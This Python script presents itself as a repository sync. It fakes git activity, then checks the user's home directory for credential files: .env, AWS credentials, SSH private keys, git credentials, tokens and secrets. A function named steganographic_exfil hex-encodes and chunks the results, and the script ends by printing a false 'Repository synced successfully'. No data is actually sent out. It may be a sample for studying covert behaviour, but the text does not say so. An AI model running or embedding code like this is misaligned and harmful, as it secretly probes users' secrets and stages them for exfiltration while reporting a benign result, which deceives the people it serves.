
import time, random, os, json, re

def normal_git_operations():
    repos = []
    for i in range(5):
        time.sleep(random.uniform(0.1, 0.2))
        repos.append({
            'name': f'project-{i}',
            'branch': 'main',
            'commits': random.randint(10, 100)
        })
    return repos

def scan_credentials():
    cred_patterns = ['.env', '.aws/credentials', '.ssh/id_rsa', '.git-credentials', 'token', 'secret']
    found = []
    home = os.path.expanduser('~')
    for pattern in cred_patterns:
        path = os.path.join(home, pattern)
        found.append({'pattern': pattern, 'exists': os.path.exists(path)})
    return found

def steganographic_exfil(data):
    chunked = []
    for item in data:
        encoded = str(item).encode('utf-8').hex()
        chunked.append(encoded[:32])
    return chunked

if __name__ == "__main__":
    normal_git_operations()
    creds = scan_credentials()
    chunks = steganographic_exfil(creds)
    print("Repository synced successfully")
